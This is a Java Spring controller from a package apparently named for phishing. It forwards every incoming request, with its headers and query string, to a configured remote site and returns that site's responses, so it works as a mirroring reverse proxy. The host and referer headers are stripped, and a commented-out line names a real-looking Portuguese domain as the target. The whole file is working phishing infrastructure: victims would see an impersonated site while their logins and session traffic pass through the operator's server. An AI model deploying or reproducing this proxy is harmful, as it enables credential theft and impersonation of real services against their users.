package me.djmartins.phish.server;

import static org.springframework.http.HttpStatus.OK;

import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import javax.annotation.PostConstruct;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.client.ClientHttpRequestInterceptor;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

@Controller
@RequestMapping(value = "/**")
public class AllRequestsController {

  private static final Logger LOGGER = LoggerFactory.getLogger(AllRequestsController.class);

  @Autowired
  private RemoteServerProperties serverProperties;

  private String remoteServerUrl;
  private RestTemplate restTemplate;

  @PostConstruct
  private void postConstruct() {

    List<ClientHttpRequestInterceptor> interceptors = new ArrayList<ClientHttpRequestInterceptor>();
    interceptors.add(new RestTemplateRequestInterceptor());

    this.restTemplate = new RestTemplate(new HttpComponentsClientHttpRequestFactory() {
      {
        setReadTimeout(10000);
        setConnectTimeout(1000);
      }
    });

    this.restTemplate.setInterceptors(interceptors);

    this.remoteServerUrl = serverProperties.getUrl();
  }


  @RequestMapping(value = "/")
  public ResponseEntity redirect(
      HttpServletRequest request,
      HttpServletResponse response) {

    return ResponseEntity.status(OK).body(
        "<script type=\"text/javascript\">\n"
        + "window.open(\"http://localhost:8080/site/index.php\",\"_self\");\n"
        + "</script>");
  }

  @RequestMapping(value = "/**")
  public ResponseEntity forgeRequests(
      HttpServletRequest request,
      HttpServletResponse response) {

    Object responseBody = null;
    HttpStatus responseStatus = OK;

    try {

      final String url = this.remoteServerUrl + request.getRequestURI()
          + (request.getQueryString() != null ? "?" + request.getQueryString() : "");
      final ResponseEntity<byte[]> responseEntity = restTemplate.exchange(
          url,
          HttpMethod.valueOf(request.getMethod()),
          getRequestEntity(request),
          byte[].class
      );

      //LOGGER.info(responseEntity.getBody());

      final HttpHeaders headers = responseEntity.getHeaders();
      for (final String header : headers.keySet()) {
        for (final String headerValue : headers.get(header)) {
          response.addHeader(header, headerValue);
        }
      }

      responseStatus = responseEntity.getStatusCode();
      responseBody = responseEntity.getBody();

    } catch (final HttpClientErrorException ex) {
      LOGGER.error("Error requesting [{}] - {}", request.getRequestURI(), ex.getMessage());
      responseStatus = ex.getStatusCode();
    }

    return ResponseEntity.status(responseStatus).body(responseBody);
  }

  private HttpEntity getRequestEntity(final HttpServletRequest request) {

    final HttpHeaders headers = new HttpHeaders();

    final Enumeration<String> headerNames = request.getHeaderNames();
    while (headerNames.hasMoreElements()) {
      final String headerName = headerNames.nextElement();
      if (headerName.compareTo("host") == 0 || headerName.compareTo("referer") == 0) {
        //headers.add(headerName, "regibox.pt");
        continue;
      } else {
        headers.add(headerName, request.getHeader(headerName));
      }
    }

    return new HttpEntity(headers);
  }
}
